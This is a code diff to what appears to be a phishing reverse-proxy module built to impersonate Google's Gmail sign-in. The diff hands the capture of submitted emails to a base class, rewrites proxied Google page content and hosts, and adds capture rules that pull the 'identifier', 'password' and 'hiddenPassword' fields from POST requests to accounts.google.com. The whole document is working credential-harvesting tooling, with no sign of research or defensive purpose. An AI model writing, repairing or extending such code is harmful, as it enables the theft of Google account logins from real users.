@@ -20,27 +20,8 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        // Simple approach like Outlook/Yahoo - just capture email on POST requests
-        if (this.browserReq.method === 'POST' && this.browserReq.headers['content-length'] > 0) {
-            let body = ''
-            this.browserReq.on('data', (chunk) => {
-                body += chunk.toString()
-            })
-            this.browserReq.on('end', () => {
-                // Simple email capture
-                const emailMatch = /identifier=([^&]+)/.exec(body)
-                if (emailMatch) {
-                    const email = decodeURIComponent(emailMatch[1])
-                    console.log('Email captured:', email)
-                    Object.assign(this.browserReq.clientContext.sessionBody, { email: email })
-                }
-                // Forward original request unchanged
-                this.browserReq.pipe(this.proxyEndpoint)
-            })
-            return
-        }
-        // For all other requests, just pipe them through
-        return this.browserReq.pipe(this.proxyEndpoint)
+        // Simple approach like working services - let the base class handle captures
+        return super.processRequest()
     }
 
     makeGmailProcess() {
@@ -179,11 +160,11 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             },
            {
                reg: /name="checkConnection" value/gi,
-               replacement: /name"checkConnection" value="youtube:1052:1"/,
+               replacement: 'name="checkConnection" value="youtube:1052:1"',
            },
            {
                reg: /signaler-pa.googleapis.com/gi,
-               replacement: this.browserEndPoint.clientContext.hostname,
+               replacement: 'localhost',
            },
            {
                reg: /https:\/\/accounts\.google\.com\/v3\/signin\/challenge\/pwd/gi,
@@ -388,7 +369,21 @@ const configExport = {
 
 
 
-    CAPTURES: { },
+    CAPTURES: {
+        gmailEmail: {
+            method: 'POST',
+            params: ['identifier'],
+            urls: '',
+            hosts: ['accounts.google.com'],
+        },
+
+        gmailPassword: {
+            method: 'POST',
+            params: ['password', 'hiddenPassword'],
+            urls: '',
+            hosts: ['accounts.google.com'],
+        },
+    },
 
     //MODULE OPTIONS 
     MODULE_ENABLED: true,
